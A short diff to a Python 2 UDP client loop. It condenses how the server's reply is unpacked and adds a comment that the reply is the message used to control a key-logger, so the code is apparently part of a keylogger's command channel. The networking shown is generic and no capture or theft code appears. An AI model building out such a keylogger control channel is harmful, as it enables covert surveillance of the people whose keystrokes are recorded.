@@ -19,10 +19,8 @@ while(1) :
         s.sendto(msg, (host, port))
         
         # receive data from client (data, addr)
-        d = s.recvfrom(1024)
-        reply = d[0]
-        addr = d[1]
-        
+        reply,addr = s.recvfrom(1024)
+        # this reply will be the massage which you want from the server to control the key-logger
         print 'Server reply : ' + reply
     
     except socket.error, msg:
